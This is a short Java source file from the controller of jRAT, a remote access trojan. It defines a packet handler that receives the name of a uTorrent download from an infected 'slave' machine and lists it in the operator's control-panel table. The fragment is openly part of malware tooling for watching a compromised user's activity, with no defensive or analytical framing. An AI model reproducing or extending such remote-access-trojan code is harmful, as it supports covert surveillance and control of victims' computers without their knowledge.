package io.jrat.controller.packets.incoming;

import io.jrat.controller.Slave;
import io.jrat.controller.ui.frames.FrameControlPanel;
import io.jrat.controller.ui.panels.PanelControluTorrentDownloads;
import java.io.DataInputStream;


public class Packet40UTorrentDownload extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String name = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControluTorrentDownloads panel = (PanelControluTorrentDownloads) frame.panels.get("utorrent downloads");
			panel.getModel().addRow(new Object[] { panel.getIcon(), name });
		}
	}

}
